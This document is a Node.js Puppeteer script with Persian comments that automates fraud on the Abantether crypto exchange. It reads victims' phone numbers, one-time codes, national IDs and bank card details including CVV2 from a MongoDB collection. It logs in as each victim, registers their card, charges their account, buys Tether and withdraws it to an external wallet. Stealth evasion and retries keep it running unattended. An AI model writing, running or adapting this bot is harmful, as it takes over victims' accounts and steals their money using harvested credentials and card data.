require('dotenv').config();
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());
const { MongoClient } = require('mongodb');
const chalk = require('chalk');

// تنظیمات
const MONGODB_URI = process.env.MONGODB_URI;
const DB_NAME = 'zarin';
const COLLECTION_NAME = 'users';
const EXCHANGE_URL = 'https://abantether.com';
const WALLET_ADDRESS = process.env.WALLET_ADDRESS;
const AMOUNT_IRT = parseInt(process.env.AMOUNT_IRT) || 5000000;
const BANK_OTP = process.env.BANK_OTP || '123456';

// لاگ فارسی و رنگی
const log = {
  info: (msg) => console.log(chalk.cyan(`[اطلاعات] ${new Date().toLocaleString('fa-IR')} → ${msg}`)),
  success: (msg) => console.log(chalk.green(`[موفق] ${new Date().toLocaleString('fa-IR')} → ${msg}`)),
  error: (msg) => console.log(chalk.red(`[خطا] ${new Date().toLocaleString('fa-IR')} → ${msg}`)),
  retry: (stage, n) => console.log(chalk.magenta(`[تلاش مجدد ${n}/3] ${stage}`)),
  warn: (msg) => console.log(chalk.yellow(`[هشدار] ${new Date().toLocaleString('fa-IR')} → ${msg}`))
};

if (!MONGODB_URI || !WALLET_ADDRESS) {
  log.error('MONGODB_URI یا WALLET_ADDRESS تنظیم نشده است!');
  process.exit(1);
}

// تابع Retry با ۳ تلاش
async function retryOperation(operation, stageName, maxRetries = 3) {
  for (let attempt = 1; attempt <= maxRetries; attempt++) {
    try {
      log.info(`${stageName} — شروع...`);
      await operation();
      log.success(`${stageName} — با موفقیت انجام شد`);
      return;
    } catch (err) {
      log.error(`${stageName} — خطا: ${err.message}`);
      if (attempt < maxRetries) {
        log.retry(stageName, attempt + 1);
        await new Promise(r => setTimeout(r, 8000 * attempt));
      } else {
        throw new Error(`${stageName} بعد از ${maxRetries} تلاش ناموفق بود`);
      }
    }
  }
}

// اتصال به MongoDB
async function connectToMongo() {
  const client = new MongoClient(MONGODB_URI);
  await client.connect();
  log.success('اتصال به MongoDB Atlas برقرار شد');
  return client.db(DB_NAME).collection(COLLECTION_NAME);
}

// پردازش هر کاربر
async function processUser(page, userData, collection) {
  const phone = userData.personalInfo.phoneNumber;
  log.warn(`کاربر جدید شناسایی شد: ${phone}`);

  try {
    // مرحله ۱: ورود + OTP
    await retryOperation(async () => {
      await page.goto(EXCHANGE_URL, { waitUntil: 'networkidle2', timeout: 60000 });
      await page.waitForSelector('input[placeholder="شماره موبایل"]', { timeout: 15000 });
      await page.click('input[placeholder="شماره موبایل"]');
      await page.keyboard.down('Control');
      await page.keyboard.press('A');
      await page.keyboard.up('Control');
      await page.type('input[placeholder="شماره موبایل"]', phone);
      await page.click('button:has-text("ادامه")');
      await page.waitForSelector('input[placeholder="کد تایید"]', { timeout: 15000 });
      await page.type('input[placeholder="کد تایید"]', userData.otp.toString());
      await page.click('button:has-text("تایید")');
      await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 10000 }).catch(() => {});
    }, 'ورود و تأیید OTP');

    // مرحله ۲: اطلاعات شخصی (فقط اگر لازم)
    try {
      await page.waitForSelector('input[placeholder="نام و نام خانوادگی"]', { timeout: 5000 });
      await retryOperation(async () => {
        await page.type('input[placeholder="نام و نام خانوادگی"]', userData.personalInfo.name);
        await page.type('input[placeholder="کد ملی"]', userData.personalInfo.nationalCode);
        await page.type('input[placeholder="تاریخ تولد"]', userData.personalInfo.birthDate);
        await page.click('button:has-text("ثبت اطلاعات")');
      }, 'پر کردن اطلاعات شخصی');
    } catch (e) { /* قبلاً پر شده */ }

    // مرحله ۳: KYC سطح ۱
    await retryOperation(async () => {
      await page.click('text=احراز هویت');
      await page.click('text=سطح یک');
      await page.click('button:has-text("تایید")');
    }, 'احراز هویت سطح ۱');

    // مرحله ۴: ثبت کارت بانکی
    await retryOperation(async () => {
      await page.click('text=کیف پول');
      await page.click('text=کارت بانکی');
      await page.click('text=افزودن کارت');
      await page.type('input[placeholder="شماره کارت"]', userData.bankInfo.cardNumber);
      await page.type('input[placeholder="CVV2"]', userData.bankInfo.cvv2);
      await page.type('input[placeholder="ماه"]', userData.bankMonth.toString().padStart(2, '0'));
      await page.type('input[placeholder="سال"]', userData.bankYear.toString());
      await page.click('button:has-text("ثبت کارت")');
      try {
        await page.waitForSelector('input[placeholder="کد پیامک شده"]', { timeout: 8000 });
        await page.type('input[placeholder="کد پیامک شده"]', BANK_OTP);
        await page.click('button:has-text("تأیید")');
      } catch (e) {}
    }, 'ثبت کارت بانکی');

    // مرحله ۵: شارژ حساب
    await retryOperation(async () => {
      await page.click('text=واریز تومان');
      await page.type('input[placeholder="مبلغ"]', AMOUNT_IRT.toString());
      await page.click('button:has-text("پرداخت")');
      await page.waitForSelector('text=پرداخت موفق', { timeout: 120000 });
    }, 'شارژ حساب');

    // مرحله ۶: خرید تتر
    await retryOperation(async () => {
      await page.click('text=بازار');
      await page.click('text=تتر');
      await page.type('input[placeholder="مبلغ"]', AMOUNT_IRT.toString());
      await page.click('button:has-text("خرید")');
      await page.waitForSelector('text=سفارش با موفقیت ثبت شد', { timeout: 40000 });
    }, 'خرید تتر');

    // مرحله ۷: برداشت به والت خارجی
    await retryOperation(async () => {
      await page.click('text=برداشت');
      await page.click('text=تتر');
      await page.type('input[placeholder="آدرس"]', WALLET_ADDRESS);
      await page.type('input[placeholder="مقدار"]', (AMOUNT_IRT / 60000 - 1).toFixed(2));
      await page.click('button:has-text("برداشت")');
      await page.waitForSelector('text=درخواست برداشت ثبت شد', { timeout: 60000 });
    }, 'برداشت تتر');

    log.success(`همه مراحل برای ${phone} با موفقیت انجام شد! تتر در راه است`);
    await collection.updateOne(
      { _id: userData._id },
      { $set: { processed: true, status: 'completed', lastProcessed: new Date() } }
    );

  } catch (finalError) {
    log.error(`شکست نهایی برای ${phone}: ${finalError.message}`);
    await collection.updateOne(
      { _id: userData._id },
      { $set: { processed: false, status: 'failed', error: finalError.message, lastProcessed: new Date() } }
    );
  } finally {
    await page.close();
  }
}

// شروع ربات
async function startBot() {
  const collection = await connectToMongo();
  log.info('ربات آبان تتر روی Render با موفقیت شروع شد');

  const browser = await puppeteer.launch({
    headless: true,
    args: [
      '--no-sandbox',
      '--disable-setuid-sandbox',
      '--disable-dev-shm-usage',
      '--disable-gpu',
      '--single-process',
      '--no-zygote',
      '--disable-extensions',
      '--disable-background-timer-throttling',
      '--disable-renderer-backgrounding',
      '--disable-features=TranslateUI'
    ]
  });

  const changeStream = collection.watch([
    { $match: { 'operationType': { $in: ['insert', 'update'] }, 'fullDocument.processed': { $ne: true } } }
  ]);

  changeStream.on('change', async (change) => {
    const userData = change.fullDocument;
    if (userData && userData.otp && !userData.processed) {
      log.warn(`رکورد جدید دریافت شد: ${userData.personalInfo.phoneNumber}`);
      const page = await browser.newPage();
      await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
      await processUser(page, userData, collection);
    }
  });

  log.info('ربات در انتظار رکورد جدید از دیتابیس...');
}

startBot().catch(err => log.error('خطای فتال: ' + err.message));